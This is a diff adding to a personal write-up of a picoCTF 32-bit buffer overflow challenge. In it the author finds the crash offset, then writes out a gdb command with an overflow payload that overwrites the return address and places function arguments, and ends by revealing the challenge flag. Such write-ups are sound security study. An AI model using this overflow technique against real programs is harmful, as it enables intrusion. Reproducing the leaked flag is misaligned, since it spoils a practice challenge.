@@ -28,7 +28,20 @@ This problematic memory pointer is at address is 0xffffb6e7
 So I checked what this value normally is using gdb, and it should be 0xffb70808
 So I tried repeating that byte sequence as the junk bytes, but got another error
 
+------------------------------------
+Coming back for a try 2 after a week
+-----------------------------------
+I immediately ran it with input cyclic(512) to find that it seg faults at 112
 
+so I tried 
+(gdb) run < <(echo -ne "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x92\x04\x08\r\xf0\xfe\xca\r\xf0\r\xf0")
+This gave an error of trying to access memory 0xf00df00d.
+It turns out, I needed to add a 4 byte padding before the arguments, to block out the base pointer and instead put the arguments in the correct locations. (This was basically derived from https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/binary-exploitation/#buffer-overflow-2
+which was the identical challenge a few years ago, just with different target address and argumetents. 
+
+Finally!
+picoCTF{argum3nt5_4_d4yZ_4b24a3aa}
+-----------------------------------
 
 This answer is helpful:
 https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection
